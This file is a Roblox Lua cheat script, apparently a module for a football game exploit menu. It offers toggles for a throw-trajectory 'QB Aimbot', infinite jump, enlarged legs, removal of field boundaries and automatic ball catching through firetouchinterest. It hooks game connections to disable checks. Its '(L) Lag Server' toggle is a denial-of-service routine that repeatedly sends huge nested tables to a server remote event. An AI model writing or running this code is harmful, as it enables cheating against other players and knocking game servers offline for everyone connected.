local Mags = {
    Using = false
}

--// UI Setup
local MagToggle;
local DistanceSlider;
do
    local LastChanged = 0

    local MagSection = Variables.CatchingTab:AddSection("Main")
    
    
    
    
            local place0 = MagSection:AddToggle("QB Aimbot", {flag = "OOB_Enabled"}, function(state) 
       if state then
local TERRAIN = game.Workspace.Terrain

local BEAM = Instance.new("Beam")
BEAM.Color = ColorSequence.new(Color3.new(0, 5, 100))
BEAM.Transparency = NumberSequence.new(0)
BEAM.FaceCamera = true
BEAM.Segments = 20
BEAM.Width0 = 0.1
BEAM.Width1 = 0.1

-- Class

local Trajectory = {}
Trajectory.__index = Trajectory

-- Private Functions

local function reflect(v, n)
	return -2*v:Dot(n)*n + v
end

local function drawBeamProjectile(g, v0, x0, t)
	local c = 0.5*0.5*0.5
	local p3 = 0.5*g*t*t + v0*t + x0
	local p2 = p3 - (g*t*t + v0*t)/3
	local p1 = (c*g*t*t + 0.5*v0*t + x0 - c*(x0+p3))/(3*c) - p2
	
	local curve0 = (p1 - x0).Magnitude
	local curve1 = (p2 - p3).Magnitude
	
	local b = (x0 - p3).unit
	local r1 = (p1 - x0).unit
	local u1 = r1:Cross(b).unit
	local r2 = (p2 - p3).unit
	local u2 = r2:Cross(b).unit
	b = u1:Cross(r1).unit
	
	local cfA = CFrame.fromMatrix(x0, r1, u1, b)
	local cfB = CFrame.fromMatrix(p3, r2, u2, b)
	
	local A0 = Instance.new("Attachment")
	local A1 = Instance.new("Attachment")
	local Beam = BEAM:Clone()
	
	A0.CFrame = cfA
	A0.Parent = TERRAIN
	A1.CFrame = cfB
	A1.Parent = TERRAIN
	
	Beam.Attachment0 = A0
	Beam.Attachment1 = A1
	Beam.CurveSize0 = curve0
	Beam.CurveSize1 = -curve1
	Beam.Parent = TERRAIN
end

local Trajectory = {}
Trajectory.__index = Trajectory

-- Private Functions

local function reflect(v, n)
	return -2*v:Dot(n)*n + v
end

local function drawBeamProjectile(g, v0, x0, t)
	local c = 0.5*0.5*0.5
	local p3 = 0.5*g*t*t + v0*t + x0
	local p2 = p3 - (g*t*t + v0*t)/3
	local p1 = (c*g*t*t + 0.5*v0*t + x0 - c*(x0+p3))/(3*c) - p2
	
	local curve0 = (p1 - x0).Magnitude
	local curve1 = (p2 - p3).Magnitude
	
	local b = (x0 - p3).unit
	local r1 = (p1 - x0).unit
	local u1 = r1:Cross(b).unit
	local r2 = (p2 - p3).unit
	local u2 = r2:Cross(b).unit
	b = u1:Cross(r1).unit
	
	local cfA = CFrame.fromMatrix(x0, r1, u1, b)
	local cfB = CFrame.fromMatrix(p3, r2, u2, b)
	
	local A0 = Instance.new("Attachment")
	local A1 = Instance.new("Attachment")
	local Beam = BEAM:Clone()
	
	A0.CFrame = cfA
	A0.Parent = TERRAIN
	A1.CFrame = cfB
	A1.Parent = TERRAIN
	
	Beam.Attachment0 = A0
	Beam.Attachment1 = A1
	Beam.CurveSize0 = curve0
	Beam.CurveSize1 = -curve1
	Beam.Parent = TERRAIN
end

-- Public Constructors

function Trajectory.new(gravity)
	local self = setmetatable({}, Trajectory)
	
	self.Gravity = gravity
	self.TimeStep = 0.1
	self.MaxTime = 3
	self.MinSpeed = 15
	self.MaxBounce = 0
	
	return self
end

-- Public Methods

function Trajectory:Velocity(v0, t)
	-- g*t + v0
	return self.Gravity*t + v0
end

function Trajectory:Position(x0, v0, t)
	-- 0.5*g*t^2 + v0*t + x0
	return 0.5*self.Gravity*t*t + v0*t + x0
end

function Trajectory:PlaneQuadraticIntersection(x0, v0, p, n)
	local a = (0.5*self.Gravity):Dot(n)
	local b = v0:Dot(n)
	local c = (x0 - p):Dot(n)
	
	if (a ~= 0) then
		local d = math.sqrt(b*b - 4*a*c)
		return (-b - d)/(2*a)
	else
		return -c / b
	end
end

function Trajectory:CalculateSingle(x0, v0, ignoreList)
	local t = 0
	local hit, pos, normal, material
	
	repeat
		local p0 = self:Position(x0, v0, t)
		local p1 = self:Position(x0, v0, t + self.TimeStep)
		t = t + self.TimeStep
		
		local ray = Ray.new(p0, p1 - p0)
		hit, pos, normal, material = game.Workspace:FindPartOnRayWithIgnoreList(ray, ignoreList, false, true)
	until (hit or t >= self.MaxTime)
	
	if (hit) then
        if hit.CanCollide == false and not table.find(ignoreList, hit) then
            table.insert(ignoreList, hit)
        end
		local t = self:PlaneQuadraticIntersection(x0, v0, pos, normal)
		local x1 = self:Position(x0, v0, t)
		return t, normal, PhysicalProperties.new(material)
	end
end

function Trajectory:Cast(x0, v0, material, ignoreList)
	local bounce = 0
	local t, x1, normal, pB
	local speed2 = self.MinSpeed*self.MinSpeed
	local pA = PhysicalProperties.new(material) 
	local path = {}
	
	while (v0:Dot(v0) >= speed2 and bounce <= self.MaxBounce) do
		t, normal, pB = self:CalculateSingle(x0, v0, ignoreList)
		if (t) then
			table.insert(path, {x0, v0, t})
			
			local elast = (pA.Elasticity*pA.ElasticityWeight + pB.Elasticity*pB.ElasticityWeight)/(pA.ElasticityWeight+pB.ElasticityWeight)
			local frict = (pA.Friction*pA.FrictionWeight + pB.Friction*pB.FrictionWeight)/(pA.FrictionWeight+pB.FrictionWeight)
			local dot = 1 - math.abs(v0.Unit:Dot(normal))
			
			print(dot)
			x0 = self:Position(x0, v0, t)
			v0 = reflect(self:Velocity(v0, t), normal) * elast + v0 * frict * dot
			bounce = bounce + 1
		else
			bounce = self.MaxBounce + 1
		end
	end
	
	return path
end

function Trajectory:Draw(path)
	for i = 1, #path do
		local x0, v0, t = unpack(path[i])
		drawBeamProjectile(self.Gravity, v0, x0, t)
	end
end



local LocalPlayer = game:GetService("Players").LocalPlayer

local trajectory = Trajectory.new(Vector3.new(0, -28.5, 0))
local origin = LocalPlayer.Character:WaitForChild("Head")
local mouse = LocalPlayer:GetMouse()

local ignoreList = {game.Workspace.Terrain, LocalPlayer.Character}

local pause = false
game:GetService("RunService").RenderStepped:Connect(function(dt)
    if not pause then
        game.Workspace.Terrain:ClearAllChildren()

        if LocalPlayer.Character:FindFirstChild("Football") then
            local speed = LocalPlayer.PlayerGui:FindFirstChild("BallGui") and tonumber(LocalPlayer.PlayerGui.BallGui.Frame.Disp.Text) or 60

            local dir = (mouse.Hit.p - (origin.CFrame + Vector3.new(0,1,0)).p).Unit
            local x0 = origin.Position + dir*2
            local v0 = dir*speed
            
            local path = trajectory:Cast(x0, v0, Enum.Material.Plastic, ignoreList)
            trajectory:Draw(path)
        end
    end
end)

game:GetService("UserInputService").InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and not pause then
        pause = true
        task.delay(3, function() 
            pause = false 
        end)
    end
end)

       else
     
       end
       end)
       
    
            local place0 = MagSection:AddToggle("Infinite Jump", {flag = "OOB_Enabled"}, function(state) 
       if state then
game:GetService("UserInputService").JumpRequest:connect(function()

	game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")		

end)
spawn(function()
	local CoreGui = game:GetService("StarterGui") -- Variable of StarterGui
	CoreGui:SetCore("SendNotification", {
		-- Customizable
		Title = "Infinite Jump (WORKING)",
		Text = "DO NOT GO TOO HIGH!",
		Duration = 7, -- Set the duration to how much you want this to stay
		-- More code in part 2
	})
	end)
       else
     
       end
       end)
       
     local place0 = MagSection:AddToggle("(L) Lag Server", {flag = "OOB_Enabled"}, function(state) 
       if state then
   getgenv().Toggled=false
getgenv().KeyBind="L"
getgenv().Delay=0.7
local UIS=game:GetService'UserInputService'

--//main

local function Source()
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val) 
   local mainvalueifonetable = 49999
   if type(val) ~= "number" then
       return nil 
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval 
end

local function bomb(tableincrease, tries) 
 local maintable = {}
 local spammedtable = {}
 
 table.insert(spammedtable, {})
 z = spammedtable[1]
 
 for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
 end 
 
 local calculatemax = getmaxvalue(tableincrease) 
 local maximum 
 
 if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 
 
  if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 

 for i = 1, tries do
    game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
 end
end


bomb(250, 5) --// change values if client crashes
end
UIS.InputBegan:Connect(function(Key)
    if Key.KeyCode==Enum.KeyCode[getgenv().KeyBind:upper()] and not UIS:GetFocusedTextBox() then
        if getgenv().Toggled then
            getgenv().Toggled=false
            warn'Disabled!'
        elseif not getgenv().Toggled then
            getgenv().Toggled=true
            warn'Enabled!'
            while getgenv().Toggled do
                Source()
                wait(getgenv().Delay)
            end
        end
    end
end)
       else
     
       end
       end)
    
       local place0 = MagSection:AddToggle("Player Height", {flag = "Player_Enabled"}, function(state) 
       if state then
       game.Players.LocalPlayer.Character["Left Leg"].Size = Vector3.new(1, 15, 1)
       game.Players.LocalPlayer.Character["Left Leg"].Transparency = 1
       else
       game.Players.LocalPlayer.Character["Left Leg"].Size = Vector3.new(1, 2, 1)
       end
       end)
       
       local place0 = MagSection:AddToggle("No Out Of Bounds", {flag = "OOB_Enabled"}, function(state) 
       if state then
     spawn(function()
game.Workspace.Models.Boundaries:Destroy()
end)

spawn(function()
game.Workspace.Models.Field.Sidelines.Boundaries:Destroy()
end)  
       else
     
       end
       end)
    local place0 = MagSection:AddToggle("Mag Enable", {flag = "Mags_Enabled"}, function() end)
    getgenv().Variables.MagDistance = 8
    DistanceSlider = MagSection:AddSlider("Mag Distance", 1, 40, 8, {flag = "Mags_Distance"}, function() 
        getgenv().Variables.MagDistance = DistanceSlider.Value
    end) 
    local place = MagSection:AddBind("Mag Toggle key", Enum.KeyCode.Q, {flag = "Mags_ToggleKey"}, function() 
        LastChanged = tick()
    end)

    Variables.UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
        if not gameProcessedEvent then
            if input.KeyCode == place.Bind and tick() - LastChanged >= .3 then
                place0:Set(not Variables.CatchingTab.Flags["Mags_Enabled"], false)
            end
        end
    end)
end

--// Bootup

do
    local cached = {}

    function hookconnections(obj, connection, _function)
        local connection = obj[connection]
        for i,v in pairs(getconnections(connection)) do
            v:Disable()
            local old = v.Function
            connection:Connect(_function, old)
        end
    end 

    
    game:GetService("RunService").RenderStepped:Connect(function()
        for _, Football in pairs(workspace:GetChildren()) do
            if not cached[Football] then
                cached[Football] = {} 
                hookconnections(Football, "AncestryChanged", function()
                    return nil 
                end)
            end
        end
    end)
      

    task.spawn(function()
        while true do
            if game:GetService("Players").LocalPlayer:FindFirstChildOfClass("Vector3Value") then
                game:GetService("Players").LocalPlayer:FindFirstChildOfClass("Vector3Value").Value = Vector3.new()
            end

            task.wait() 
        end
    end)
end

function Mags:Validated()
    return Variables.ReplicatedStorage:WaitForChild("Values"):WaitForChild("Fumble").Value ~= true and Variables.ReplicatedStorage:WaitForChild("Values"):WaitForChild("Status").Value == "InPlay"
end

function Mags:Mag(Football)
    local Character = Variables.Character
    if Character then
        self.Using = true
        local Starting = tick()
        local Connections = {}

        local LeftArm = Character and Character:FindFirstChild("Left Arm")
        local RightArm = Character and Character:FindFirstChild("Right Arm")

        local LeftArmDist, RightArmDist = LeftArm and (LeftArm.Position - Football.Position).Magnitude or 0, RightArm and (RightArm.Position - Football.Position).Magnitude or 0
        local Distance = LeftArmDist <= RightArmDist and LeftArm or RightArmDist <= LeftArmDist and RightArm
    
        if not LeftArm or not RightArm then self.Using = false return end 
        if not self:Validated() then self.Using = false return end 

        local function StopLoop()
            Starting = nil 
            for _, connection in pairs(Connections) do
                connection:Disconnect()
            end
            table.clear(Connections)
            self.Using = false 
        end

        local function BallUpdate()
            if Starting == nil then return end 
            local Now = tick()

            if (Now - Starting) > 5 then
                StopLoop()
                return 
            end

            if not self:Validated() then
                StopLoop()
                return
            end 

            if Football and Football.Parent then
                Football.CanCollide = false 
                firetouchinterest(Distance, Football, 0)
                task.wait()
                firetouchinterest(Distance, Football, 1)
            else
                StopLoop()
            end
        end

        table.insert(Connections, game:GetService("RunService").RenderStepped:Connect(BallUpdate))
        table.insert(Connections, game:GetService("RunService").Stepped:Connect(BallUpdate))
        table.insert(Connections, game:GetService("RunService").Heartbeat:Connect(BallUpdate))
    end
end

function Mags:Activate()
    local ClosestDistance = math.huge; local ClosestFootball = nil; 
    for _, Part in pairs(workspace:GetChildren()) do
        if Part.Name == "Football" and Part:IsA("BasePart") then
            local RootPart = (Variables.Character and Variables.Character.PrimaryPart)
            if (RootPart) then
                local Distance =  RootPart and (RootPart.Position - Part["Position"]).Magnitude or 0
                if Distance < ClosestDistance and Distance < DistanceSlider.Value then
                    ClosestFootball = Part 
                    ClosestDistance = Distance 
                end
            end
        end
    end

    if (ClosestFootball) then
        self:Mag(ClosestFootball)
    end
end

do
    game:GetService("RunService").RenderStepped:Connect(function()
        if Variables.CatchingTab.Flags["Mags_Enabled"] then
            Mags:Activate()
        end
    end)
end


return Mags 
